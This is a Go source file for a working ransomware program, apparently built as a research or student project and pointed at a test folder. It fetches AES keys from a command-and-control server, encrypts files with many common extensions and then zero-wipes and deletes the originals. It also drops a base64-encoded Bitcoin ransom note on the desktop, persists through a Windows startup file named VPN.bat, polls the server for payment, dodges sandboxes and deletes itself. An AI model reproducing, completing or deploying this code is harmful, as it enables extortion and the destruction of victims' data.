package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var (
	// Modes
	connectionMode = 0
	encryptionMode = 1
	payed          = 2
	decriptionMode = 3
	removeIt       = 4

	// additional
	newV  = "TmV3IHZpY3RpbSE="                             // New victim!
	payd  = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8=" // has this idiot payed the ransom?
	ypay  = "R29vZCBib3kgXl9e"                             // Good boy ^_^
	mny   = "bW8tbW8tbW8tbW9uZXk="                         // mo-mo-mo-money
	hlp   = "Z2V0dGluZyBrZXk="                             // getting key
	kproc = "LS1LRVktUFJPQ0VEVVJFLS0="                     // --KEY-PROCEDURE--

	// Website content
	web = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPHRpdGxlPk9UIFJQIFYuU2hlbGw8L3RpdGxlPgogIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjIvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIj4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMy41LjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3BvcHBlci5qcy8xLjE2LjAvdW1kL3BvcHBlci5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjUuMi9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ym9keT4KCjxkaXYgY2xhc3M9Imp1bWJvdHJvbiB0ZXh0LWNlbnRlciI+CiAgPGgxPlJlc2VhcmNoIFByb2plY3QhPC9oMT4KICA8cD5IZWV5LCBpdCBsb29rcyBsaWtlIGFsbCB5b3VyIHByZWNpb3VzIGRhdGEgaGFzIGJlZW4gZW5jcnlwdGVkIHdpdGggYW4gTWlsaXRhcnkgYWxnb3JpdGhtLjwvYnI+ClRoZXJlIGlzIG5vIHdheSB0byByZXN0b3JlIHlvdXIgZGF0YSB3aXRob3V0IGEgc3BlY2lhbCBrZXkuPC9icj4KT25seSB3ZSBjYW4gZGVjcnlwdCB5b3VyIGZpbGVzITwvYnI+ClRvIHB1cmNoYXNlIHlvdXIga2V5IGFuZCByZXN0b3JlIHlvdXIgZGF0YSwgcGxlYXNlIGZvbGxvdyB0aGUgdGhyZWUgZWFzeSBzdGVwcy48L2JyPjwvYnI+CiAgIApXQVJOSU5HOjwvYnI+CkRvIE5PVCBhdHRlbXB0IHRvIGRlY3J5cHQgeW91ciBmaWxlcyB3aXRoIGFueSBzb2Z0d2FyZSBhcyBpdCBpcyBvYnNlbGV0ZSBhbmQgd2lsbCBub3Qgd29yaywgYW5kIG1heSBjb3N0IHlvdSBtb3JlIHRvIHVubG9jayB5b3VyIGZpbGVzLjwvYnI+CkRvIE5PVCBjaGFuZ2UgZmlsZSBuYW1lcywgbWVzcyB3aXRoIHRoZSBmaWxlcywgb3IgcnVuIGRlY2NyeXB0aW9uIHNvZnR3YXJlIGFzIGl0IHdpbGwgY29zdCB5b3UgbW9yZSB0byB1bmxvY2sgeW91ciBmaWxlcy0KLWFuZCB0aGVyZSBpcyBhIGhpZ2ggY2hhbmNlIHlvdSB3aWxsIGxvc2UgeW91ciBmaWxlcyBmb3JldmVyLjwvYnI+CldlIFdJTEwgZGVsZXRlIHlvdXIgZmlsZXMgYWx0b2dldGhlciBhbmQgdGhyb3cgYXdheSB0aGUga2V5IGlmIHlvdSByZWZ1c2UgdG8gcGF5LiBIYXZlIGZ1biEgPC9icj4KICAKICA8L3A+IAo8L2Rpdj4KICAKPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgPGRpdiBjbGFzcz0iY29sLXNtLTQiPgogICAgICA8aDM+U3RlcCAxPC9oMz4KICAgICAgPHA+RW1haWwgdXMgd2l0aCB0aGUgc3ViamVjdDwvYnI+PGI+ICJBbSBJIGdvb2QgYm95PyI8L2I+PC9icj4gdG8gc25lMjFAZXhhbXBsZS5jb208L3A+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNvbC1zbS00Ij4KICAgICAgPGgzPlN0ZXAgMjwvaDM+CiAgICAgIDxwPj0+IFlvdSB3aWxsIHJlY2lldmUgeW91ciBwZXJzb25hbCBCVEMgYWRkcmVzcyBmb3IgcGF5bWVudC4gU2VuZCAwLjAxIEJUQyB0byB0aGlzIGFkZHJlc3MuPC9icj4KICAgPT4gT25jZSBwYXltZW50IGhhcyBiZWVuIGNvbXBsZXRlZCwgc2VuZCBhbm90aGVyIGVtYWlsIHRvIHNuZTIxQGV4YW1wbGUuY29tIHN0YXRpbmcgIkRPTkUiLjwvYnI+CiAgID0+IFdlIHdpbGwgY2hlY2sgdG8gc2VlIGlmIHBheW1lbnQgaGFzIGJlZW4gcGFpZC48L3A+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNvbC1zbS00Ij4KICAgICAgPGgzPlN0ZXAgMzwvaDM+ICAgICAgICAKICAgICAgPHA+VGhlIHByb2dyYW0gd2lsbCBhdXRvbWF0aWNhbGx5IGNoZWNrIGluIHRpbWUgaW50ZXJ2YWxzIGlmIHlvdSBoYXZlIHBhaWQgYW5kIHdpbGwgZGVjcnlwdCB5b3VyIGZpbGVzLjwvcD4KICAgICAgPHA+PT4gVGhlcmVmb3JlOiBEbyBub3Qga2lsbCB0aGUgcHJvZ3JhbSBwcm9jZXNzLiBPdGhlcndpc2UgeW91ciBkYXRhIHdpbGwgYmUgbG9zdCE8L3A+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9kaXY+Cgo8L2JvZHk+CjwvaHRtbD4="

	// Messages
	tkmsgMsg  = "RGVjcnlwdCBmaWxlcyBub3c/"                                                                                                     // Decrypt files now?
	tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0" // Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
	tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0"                                                                                                 // Now your data is lost
	tkmsg3Msg = "R29vZCBib3kgXl9e"

	// Files
	listFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
	ident     = "L2lkZW50aWZpZXI="                                         // /identifier
	ends      = "LnNuZTIx"                                                 //.sne21

	// List of extensions which will be encrypted
	extensions = []string{
		"exe", "dll", "so", "rpm", "deb", "vmlinuz", "img", "txt", // SYSTEM FILES
		"jpeg", "jpg", "bmp", "gif", "png", "svg", "psd", "raw", "webp", // images
		"mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape", // music and sound
		"avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp", // Video and movies

		"doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", // Microsoft office
		"odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md", // OpenOffice, Adobe, Latex, Markdown, etc
		"yml", "yaml", "json", "xml", "csv", // structured data
		"db", "sql", "dbf", "mdb", "iso", // databases and disc images

		"html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css", // web technologies

		"zip", "tar", "tgz", "bz2", "7z", "rar", "bak", // compressed formats}
	}

	// C&C server
	server = "10.1.1.212:6666"

	// Get the path to executable
	filePath, _ = os.Executable()
	// Get the OS
	runtimeOS = runtime.GOOS
	// Get dir info
	userDir, _ = os.UserHomeDir()
)

// struct, which stores key and iv
type ketIV struct {
	key []byte
	iv  []byte
}

func letItBurn(presents bool) {
	if presents {
		retreat()
	} else {
		fmt.Println("Oh, nooo!Work again?! \nDobby will never be free...")

		notDecrypted := true
		addToAutoRun(false)
		stopSignal := false
		for true {
			if !isEncrypted() {
				UID := checkUID()
				connection(connectionMode, UID, decodeB64(newV))
				ketIV := getKey(encryptionMode, UID, decodeB64(hlp))
				encryption(ketIV)
				message()
				fmt.Println("Do not destroy the current process, otherwise your data will be irreversibly encrypted!")
			} else if isEncrypted() {
				time.Sleep(30 * time.Second)
				UID := checkUID()
				if !stopSignal {
					fmt.Println("Please use the instructions in the .html file on your Desktop to decrypt your data.")
					stopSignal = true
				}
				connection(connectionMode, UID, decodeB64(newV))
				fmt.Println("If you payed, this window will automatically check and decrypt your data.")
				if isPayed(payed, UID, decodeB64(payd)) {
					fmt.Println("You're good boy ^_^. Now I will recover your files!\n => Do not kill this process, otherwise your data is lost!")
					mR := moneyRecieved()
					if mR {
						removeAllFiles(mR)
						removeFromServer(removeIt, UID, decodeB64(mny))
					} else {
						for notDecrypted {
							ketIV := getKey(decriptionMode, UID, decodeB64(ypay))
							if decryptData(ketIV) {
								removeFromServer(removeIt, UID, decodeB64(mny))
								fmt.Println("Your files has been decrypted!\nThank you and Byyeee!")
								notDecrypted = false
								time.Sleep(2 * time.Second)
							}
						}
						removeAllFiles(mR)
						addToAutoRun(true)
					}
					break
				} else {
					time.Sleep(20 * time.Second)
				}
			}
		}
		removeItself()
	}
	os.Exit(0)
}

// If detect the present of debugger or sandbox - does not do anything suspicious
func retreat() {
	url := "https://harrypotter.fandom.com/wiki/Dobby"
	if runtimeOS == "windows" {
		_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	} else if runtimeOS == "linux" {
		_ = exec.Command("xdg-open", url).Start()
	}
}

// For Windows OS add to Autorun using folder
func addToAutoRun(status bool) {
	if runtimeOS == "windows" {
		userName, _ := user.Current()
		batPath := userName.HomeDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
		if status {
			err := os.Remove(batPath + "\\" + "VPN.bat")
			if err != nil {
				fmt.Println("Error while cleaning up: " + err.Error())
				os.Exit(1)
			}
		} else {
			file, _ := os.OpenFile(batPath+"\\"+"VPN.bat", os.O_CREATE|os.O_RDWR, 0700)
			_, _ = file.Write([]byte("start \"\" \"" + filePath + "\""))
			file.Close()
		}
	}
}

// base64 encoding
func decodeB64(toDec string) string {
	sDec, _ := base64.StdEncoding.DecodeString(toDec)
	return string(sDec)
}

// Checking if file was encrypted
func isEncrypted() bool {
	filename := userDir + decodeB64(ident)
	if file, err := os.Open(filename); err == nil {
		defer file.Close()
		scanner := bufio.NewReader(file)
		_, _, _ = scanner.ReadLine()
		isEnc, _, _ := scanner.ReadLine()
		if string(isEnc) == "0" {
			return true
		}
	}
	return false
}

// Read User ID from file or create it using rand 64-byte
func checkUID() string {
	filename := userDir + decodeB64(ident)
	var UID string

	if file, err := os.Open(filename); err == nil {
		scanner := bufio.NewReader(file)
		userId, _, _ := scanner.ReadLine()
		UID = string(userId)
		file.Close()
	} else {
		file.Close()
		rndm := make([]byte, 64)
		_, _ = rand.Read(rndm)
		UID = hex.EncodeToString(rndm)
		fileW, _ := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0755)
		_, _ = fileW.Write([]byte(UID))
		fileW.Close()
	}
	return UID
}

// Connection to the C&C server
func connection(mode int, UID, additional string) {
	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", server, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*" + additional))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		conn.Close()

		splitted := strings.Split(data, "*_*")
		if splitted[0] == "OK0" && splitted[1] == "True" {
			return
		} else {
			return
		}
	}
	return
}

// Getting key from C&C server
func getKey(mode int, UID, additional string) ketIV {
	var ketIV ketIV

	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", server, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*" + additional))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		conn.Close()

		splitted := strings.Split(data, "*_*")
		splittedketIV := strings.Split(splitted[2], decodeB64(kproc))
		ketIV.key, _ = hex.DecodeString(splittedketIV[0])
		ketIV.iv, _ = hex.DecodeString(splittedketIV[1])
		break
	}
	return ketIV
}

func encryption(ketIV ketIV) {
	var filesToEncrypt []string
	block, err := aes.NewCipher(ketIV.key)
	if err != nil {
		fmt.Println(err)
	}
	enc := cipher.NewCBCEncrypter(block, ketIV.iv)

	// userName, _ := user.Current()
	err = filepath.Walk("C:\\test", func(path string, info fs.FileInfo, err error) error {
		//err = filepath.Walk(userName.HomeDir+"/testDir", func(path string, info fs.FileInfo, err error) error {
		//err = filepath.Walk("D:\\buckt\\Desktop\\ransomware_code\\go_code\\test", func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			for _, elem := range extensions {
				if filepath.Ext(path)[1:] == elem {
					filesToEncrypt = append(filesToEncrypt, path)
				}
			}
		}
		return nil
	})
	if err != nil {
		fmt.Println(err)
	}

	filename := userDir + decodeB64(listFiles)
	oFile, _ := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0755)
	for _, file := range filesToEncrypt {
		_, _ = oFile.Write([]byte(file + "\n"))
	}
	oFile.Close()

	for _, fileEnc := range filesToEncrypt {
		fi, _ := os.Stat(fileEnc)
		fileSize := fi.Size()

		// write only flag needed here
		outfile, _ := os.OpenFile(fileEnc+decodeB64(ends), os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0755)

		_, _ = outfile.Write([]byte(strconv.FormatInt(fileSize, 10) + "-!>"))
		for true {
			//data := make([]byte, datasize)

			read, _ := ioutil.ReadFile(fileEnc)
			data := read
			if len(read) == 0 {
				break
			} else if len(read)%16 != 0 {
				//fmt.Println(read)
				data = append(data, bytes.Repeat([]byte(` `), 16-len(read)%16)...)
				//fmt.Println(read)
			}
			encrypted := make([]byte, len(data))
			enc.CryptBlocks(encrypted, data)
			_, _ = outfile.Write(encrypted)
			break
		}
		outfile.Close()
		content, _ := os.OpenFile(fileEnc, os.O_RDWR, 0755)
		_, _ = content.Write(bytes.Repeat([]byte(`0`), int(fileSize)))
		content.Close()
		_ = os.Remove(fileEnc)
	}
	fl, _ := os.OpenFile(userDir+decodeB64(ident), os.O_WRONLY|os.O_APPEND, 0755)
	_, _ = fl.Write([]byte("\n0"))
	fl.Close()

	// clear key and iv value and manually trigger garbage collection
	ketIV.key = nil
	ketIV.iv = nil
	runtime.GC()
	return
}

func isPayed(mode int, UID, additional string) bool {
	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", server, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*" + additional))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		conn.Close()

		splitted := strings.Split(data, "*_*")
		if splitted[0] == strconv.Itoa(mode) && splitted[1] == UID && splitted[2] == "True" {
			return true
		} else {
			return false
		}
	}
	return false
}

func removeFromServer(mode int, UID, additional string) {
	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", server, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*" + additional))
		buf := make([]byte, 1024)
		for true {
			read, _ := conn.Read(buf)
			if read < 1 {
				break
			}
		}
		conn.Close()
		return
	}
	return
}

func decryptData(ketIV ketIV) bool {
	var filesToDecrypt []string
	block, _ := aes.NewCipher(ketIV.key)
	dec := cipher.NewCBCDecrypter(block, ketIV.iv)

	filename := userDir + decodeB64(listFiles)

	if ofile, err := os.Open(filename); err == nil {
		scanner := bufio.NewScanner(ofile)
		// line by line
		for scanner.Scan() {
			filesToDecrypt = append(filesToDecrypt, scanner.Text())
		}
		ofile.Close()
	}

	for _, fileDec := range filesToDecrypt {
		filein, _ := os.Open(fileDec + decodeB64(ends))
		fileSizeReader := bufio.NewReader(filein)
		fSizeStr, _ := fileSizeReader.ReadString('>')
		orgFileSize := int64(0)
		if bytes.HasSuffix([]byte(fSizeStr), []byte("-!>")) {
			orgFileSize, _ = strconv.ParseInt(fSizeStr[:len(fSizeStr)-3], 10, 64)
		}
		filein.Close()

		outfile, _ := os.OpenFile(fileDec, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0755)

		for true {
			read, _ := ioutil.ReadFile(fileDec + decodeB64(ends))
			//fmt.Println(data)
			read = read[len(fSizeStr):]
			if len(read) == 0 {
				break
			}
			decrypted := make([]byte, len(read))
			dec.CryptBlocks(decrypted, read)
			_, _ = outfile.Write(decrypted)
			break
		}
		outfile.Close()
		_ = os.Truncate(fileDec, orgFileSize)

		fi, _ := os.Stat(fileDec + decodeB64(ends))
		fileSize := fi.Size()
		content, _ := os.OpenFile(fileDec+decodeB64(ends), os.O_RDWR, 0755)
		_, _ = content.Write(bytes.Repeat([]byte(`0`), int(fileSize)))
		content.Close()
		_ = os.Remove(fileDec + decodeB64(ends))
	}
	return true
}

func message() {
	// path separator for each OS / = Linux; \ = Windows
	desktop := userDir + string(os.PathSeparator) + "Desktop"
	end := string(os.PathSeparator) + "index.html"
	var fileEnd string
	if file, err := os.OpenFile(desktop+end, os.O_CREATE|os.O_RDWR, 0755); err == nil {
		_, _ = file.Write([]byte(decodeB64(web)))
		file.Close()
		fileEnd = desktop + end
	} else {
		fileA, _ := os.OpenFile(userDir+end, os.O_CREATE|os.O_RDWR, 0755)
		_, _ = fileA.Write([]byte(decodeB64(web)))
		fileA.Close()
		fileEnd = userDir + end
	}

	fmt.Println(decodeB64(tkmsg1Msg) + " [ENTER]")
	result, _, _ := bufio.NewReader(os.Stdin).ReadRune()
	if result == '\n' {
		if runtimeOS == "windows" {
			_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", fileEnd).Start()
		} else if runtimeOS == "linux" {
			_ = exec.Command("xdg-open", fileEnd).Start()
		}
	}
}

func removeItself() {
	// trigger self remove
	if runtimeOS == "windows" {
		if file, err := os.OpenFile("VPN.bat", os.O_CREATE|os.O_RDWR, 0755); err == nil {
			_, _ = file.Write([]byte("@ECHO OFF\ntimeout /t 5 /nobreak > NUL\n" +
				"type nul > \"" + filePath + "\"\n" +
				"DEL /q /s \"" + filePath + "\"\n" +
				"type nul > \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat" + "\"\n" +
				"DEL /q /s \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat" + "\""))
			file.Close()
			kill := filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat"
			cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/C", kill)
			_ = cmd.Start()
		}
	}
}

func moneyRecieved() bool {
	fmt.Print(decodeB64(tkmsgMsg) + " y/n: ")
	result, _, _ := bufio.NewReader(os.Stdin).ReadRune()
	if result != 'n' {
		return false
	}
	return true
}

func removeAllFiles(mR bool) {
	filename := userDir + decodeB64(listFiles)
	var files []string

	if mR {
		if ofile, err := os.Open(filename); err == nil {
			reader := bufio.NewScanner(ofile)
			for reader.Scan() {
				files = append(files, reader.Text())
			}
			ofile.Close()

			for _, file := range files {
				fileEnc := file + decodeB64(ends)
				fi, _ := os.Stat(fileEnc)
				fsize := fi.Size()
				_ = ioutil.WriteFile(fileEnc, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
				_ = os.Remove(fileEnc)
			}
		}
		idFile := userDir + decodeB64(ident)
		fi, _ := os.Stat(idFile)
		fsize := fi.Size()
		_ = ioutil.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
		_ = os.Remove(idFile)
		fmt.Println(decodeB64(tkmsg2Msg))
	} else {
		idFile := userDir + decodeB64(ident)
		fi, _ := os.Stat(idFile)
		fsize := fi.Size()
		_ = ioutil.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
		_ = os.Remove(idFile)

		fmt.Println(decodeB64(tkmsg3Msg))
	}

	fileFile := userDir + decodeB64(listFiles)
	fi, _ := os.Stat(fileFile)
	fsize := fi.Size()
	_ = ioutil.WriteFile(fileFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
	_ = os.Remove(fileFile)
}

func main() {
	if checkPresents() {
		letItBurn(true)
	}
	letItBurn(false)
}
